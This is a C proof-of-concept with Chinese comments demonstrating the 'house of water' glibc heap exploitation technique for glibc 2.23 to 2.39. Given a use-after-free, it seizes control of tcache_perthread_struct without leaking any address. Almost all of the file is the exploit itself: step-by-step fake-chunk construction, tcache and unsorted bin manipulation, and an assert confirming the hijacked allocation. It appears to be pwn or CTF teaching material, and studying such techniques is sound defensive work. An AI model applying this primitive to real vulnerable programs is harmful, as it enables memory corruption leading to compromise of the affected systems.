/**
 *  漏洞名称： house of water
 *  适用版本： glibc-2.23 ~ glibc-2.39
 *  漏洞危害： 在不泄露任何地址的情况下控制tcache_perthread_struct结构体并写入libc地址
 *  复现环境： Ubuntu 22.04
 *  编译命令： gcc -g house_of_water.c -o house_of_water
 */

/**
 *  利用条件：   存在UAF漏洞
 *  利用思路:    1.在 tcache_perthread_struct 中留下 tcache_fake_chunk 的 size (0x10001)
 *              2.创建unsorted chunk, 因此还需要创建tcache chunk填充tcache bin
 *              3.构建 tcache_fake_chunk 的 next chunk 以便将其放入unsorted bin时绕过检查
 *              4.填充tcache bin
 *              5.tcache_fake_chunk中写入fd和bk
 *              6.将 tcache_fake_chunk 放入 unsorted bin 中
 *              7.分配后即可控制 tcache_perthread_struct
 */
#define DEMO
#include <demo.h>

int main(void)
{
    dm_std_init();

    DEBUG("1.在 tcache_perthread_struct 中留下 tcache_fake_chunk 的 size (0x10001) \n");
    u64 tcache_fake_chunk_lsb = MALLOC(0x3d8);
    u64 tcache_fake_chunk_msb = MALLOC(0x3e8);
    FREE(tcache_fake_chunk_lsb);
    FREE(tcache_fake_chunk_msb);
    u64 heap_base = (tcache_fake_chunk_lsb) & ~(0xfff); // heap基地址(调试时方便计算)

    DEBUG("2.创建unsorted chunk, 因此还需要创建tcache chunk填充tcache bin\n");
    u64 tcache_bin[7];
    for (int i = 0; i < 7; i++)
    {
        tcache_bin[i] = MALLOC(0x88);
    }

    u64 unsorted_start = MALLOC(0x88);
    MALLOC(0x18);

    u64 unsorted_end = MALLOC(0x88);
    MALLOC(0x18);

    DEBUG("3.构建 tcache_fake_chunk 的 next chunk 以便将其放入unsorted bin时绕过检查\n");
    MALLOC(0xf0a0);
    u64 change_end_of_fake = MALLOC(0x418);
    FREE(change_end_of_fake);
    MALLOC(0x18);
    u64 end_of_fake = MALLOC(0x418);
    SET_ADDR_OFFSET_VALUE(change_end_of_fake, 0x10, 0x10000);
    SET_ADDR_OFFSET_VALUE(change_end_of_fake, 0x18, 0x420);

    DEBUG("4.填充tcache bin\n");
    for (int i = 0; i < 7; i++)
    {
        FREE(tcache_bin[i]);
    }

    DEBUG("5.tcache_fake_chunk中写入fd和bk\n");
    SET_ADDR_OFFSET_VALUE(unsorted_start, -0x18, 0x31);
    SET_ADDR_OFFSET_VALUE(unsorted_end, -0x18, 0x21);
    FREE(unsorted_start - 0x10);
    FREE(unsorted_end - 0x10);

    DEBUG("6.将 tcache_fake_chunk 放入 unsorted bin 中\n");
    SET_ADDR_OFFSET_VALUE(unsorted_start, -0x8, 0x91);
    SET_ADDR_OFFSET_VALUE(unsorted_end, -0x8, 0x91);
    FREE(unsorted_end);
    FREE(unsorted_start);
    MALLOC(0x500); // 触发unsorted bin合并
    SET_ADDR_OFFSET_VALUE(unsorted_start, 0x0, heap_base + 0x80);
    SET_ADDR_OFFSET_VALUE(unsorted_end, 0x8, heap_base + 0x80);

    FREE(end_of_fake);

    DEBUG("7.分配后即可控制 tcache_perthread_struct\n");
    u64 tcache_fake_chunk = MALLOC(0x218); // 0x208可以覆盖第一个chunk

    assert(tcache_fake_chunk == (heap_base + 0x90));
}
